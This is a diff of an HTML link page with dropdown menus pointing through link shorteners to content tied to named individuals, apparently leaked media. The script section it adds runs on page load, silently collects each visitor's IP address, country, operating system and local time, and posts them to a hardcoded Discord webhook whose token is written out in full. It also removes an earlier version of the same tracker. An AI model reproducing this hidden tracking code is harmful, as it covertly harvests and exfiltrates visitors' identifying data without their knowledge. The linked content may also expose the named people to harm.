@@ -16,6 +16,7 @@
                 <a href="https://link-target.net/455193/skillful-thing">asian-candy</a>
                 <a href="https://direct-link.net/455193/stephen-loves-gussploit">aeries-steele</a>
                 <a href="https://direct-link.net/455193/triple-calm-waves">triplexceleste</a>
+                <!-- Add more links as needed -->
             </div>
         </div>
         <div class="dropdown">
@@ -24,6 +25,7 @@
                 <a href="https://linkvertise.com/your-link-3">katiana-key</a>
                 <a href="https://link-target.net/455193/calming-waves-for-ester">ester-muniz</a>
                 <a href="https://link-target.net/455193/ashy-waves">ash-kaash</a>
+                <!-- Add more links as needed -->
             </div>
         </div>
         <div class="dropdown">
@@ -38,38 +40,40 @@
             <button class="dropbtn">Misc</button>
             <div class="dropdown-content">
                 <a href="https://linkvertise.com/your-link-8">misc-link 100+ files</a>
+                <!-- Add more links as needed -->
             </div>
         </div>
     </div>
 
     <script>
-        // Fetch user data and send to Discord webhook
-        function sendToDiscord(ip, country, os, estTime) {
-            const webhookUrl = "https://discord.com/api/webhooks/1273661921014317136/o0IODpbK8_uckv1qCYpciAWe2iSXJI_xZcORYEHSG0iRRRaGKPcwRR64eeUn35Noni-G";
-            const data = {
-                content: `IP: ${ip}\nCountry: ${country}\nOS: ${os}\nTime (EST): ${estTime}`
-            };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data),
+        // Dropdown functionality
+        document.querySelectorAll('.dropbtn').forEach(button => {
+            button.addEventListener('click', function () {
+                const dropdownContent = this.nextElementSibling;
+                dropdownContent.classList.toggle('show');
             });
+        });
+
+        // Webhook functionality
+        function sendWebhook() {
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    const payload = {
+                        content: `IP: ${data.ip}\nCountry: ${data.country}\nOperating System: ${navigator.platform}\nTime: ${new Date().toLocaleString("en-US", { timeZone: "America/New_York" })}`
+                    };
+                    fetch('https://discord.com/api/webhooks/1273661921014317136/o0IODpbK8_uckv1qCYpciAWe2iSXJI_xZcORYEHSG0iRRRaGKPcwRR64eeUn35Noni-G', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                });
         }
 
-        // Get user's IP and other data
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                const ip = data.ip;
-                const country = data.country_name;
-                const os = navigator.platform;
-                const estTime = new Date().toLocaleString("en-US", {timeZone: "America/New_York"});
-                
-                sendToDiscord(ip, country, os, estTime);
-            });
+        // Call the webhook function when the page loads
+        window.onload = sendWebhook;
     </script>
 </body>
 </html>
